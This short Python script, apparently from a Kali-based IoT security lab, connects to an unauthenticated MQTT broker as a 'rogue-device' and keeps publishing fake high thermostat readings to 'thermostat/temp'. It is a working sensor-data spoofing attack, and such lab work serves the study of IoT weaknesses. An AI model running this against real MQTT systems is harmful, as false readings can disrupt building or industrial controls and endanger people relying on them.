import paho.mqtt.client as mqtt
import time
import random

broker = "192.168.195.128" #kali-1 mqtt broker ip
port = 1883

# Create MQTT client
client = mqtt.Client("rogue-device")
client.connect(broker, port)

while True:
    fake_temp = round(random.uniform(100, 120), 1)
    client.publish("thermostat/temp", str(fake_temp))
    print(f"[ROGUE] Sent fake temp={fake_temp}")
    time.sleep(5)
